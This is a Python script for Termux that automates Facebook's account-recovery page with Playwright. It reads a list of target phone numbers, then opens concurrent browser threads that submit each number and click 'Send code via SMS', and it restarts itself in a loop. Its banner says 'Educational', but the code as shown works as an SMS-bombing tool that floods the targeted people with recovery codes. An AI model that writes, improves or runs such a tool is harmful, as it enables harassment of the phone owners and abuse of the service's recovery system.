#!/data/data/com.termux/files/usr/bin/python3
import os
import threading
import time
import sys
from playwright.sync_api import sync_playwright

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def load_targets(source):
    """Loads phone numbers from either direct input or a text file."""
    targets = []
    if source.endswith('.txt'):
        try:
            with open(source, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"[!] File '{source}' not found.")
            return []
    else:
        # Assume input is a comma or newline separated string
        targets = [num.strip() for num in source.split(',') if num.strip()]
    return targets

def worker(phone_number, thread_id):
    """Handles the automation for a single phone number in one browser."""
    print(f"[Thread-{thread_id}] Processing: {phone_number}")
    with sync_playwright() as p:
        # Launch browser (visible for debugging, set headless=True later)
        browser = p.chromium.launch(headless=False, slow_mo=100)  # slow_mo helps see actions
        context = browser.new_context()
        page = context.new_page()

        try:
            # Navigate to the Facebook account recovery page
            page.goto("https://www.facebook.com/login/identify/")
            # Wait for and fill the phone number input field
            page.fill('input[name="email"]', phone_number)  # The input field might be named 'email'
            # Click the "Search" or "Continue" button
            page.click('button[type="submit"]:has-text("Search"), text="Search"')
            # Wait for navigation
            page.wait_for_timeout(3000)
            # Try to locate and click the "Send SMS" or similar option
            page.click('a:has-text("Send code via SMS"), text="Send code via SMS"', timeout=5000)
            # Wait as specified
            page.wait_for_timeout(7000)
            print(f"[Thread-{thread_id}] Completed for: {phone_number}")
        except Exception as e:
            print(f"[Thread-{thread_id}] Error on {phone_number}: {e}")
        finally:
            browser.close()

def main():
    clear_screen()
    print("=" * 50)
    print("     Educational Automation Tool - Termux")
    print("=" * 50)

    # Step 1: Get input source
    print("\n[1] Enter phone numbers directly (comma-separated)")
    print("    OR provide a .txt file path (one number per line)")
    source = input("\nYour input: ").strip()

    targets = load_targets(source)
    if not targets:
        print("[!] No valid targets loaded. Exiting.")
        return

    print(f"[+] Loaded {len(targets)} number(s).")

    # Step 2: Get thread count
    try:
        thread_count = int(input("\n[2] Enter number of concurrent threads: "))
        thread_count = min(thread_count, len(targets))  # Don't exceed targets
    except ValueError:
        print("[!] Invalid input. Using 1 thread.")
        thread_count = 1

    # Step 3: Process targets using threading
    print(f"\n[3] Starting with {thread_count} thread(s)...\n")
    time.sleep(2)

    threads = []
    for i, number in enumerate(targets):
        # Wait if we have max active threads
        while threading.active_count() - 1 >= thread_count:  # Subtract 1 for main thread
            time.sleep(0.5)
        t = threading.Thread(target=worker, args=(number, i+1))
        t.start()
        threads.append(t)
        time.sleep(1)  # Stagger thread starts

    # Wait for all threads to complete
    for t in threads:
        t.join()

    print("\n" + "=" * 50)
    print("[✓] All threads finished. Returning to start.")
    print("=" * 50)
    input("\nPress Enter to return to the main input...")
    main()  # Restart the process

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Tool stopped by user.")
        sys.exit(0)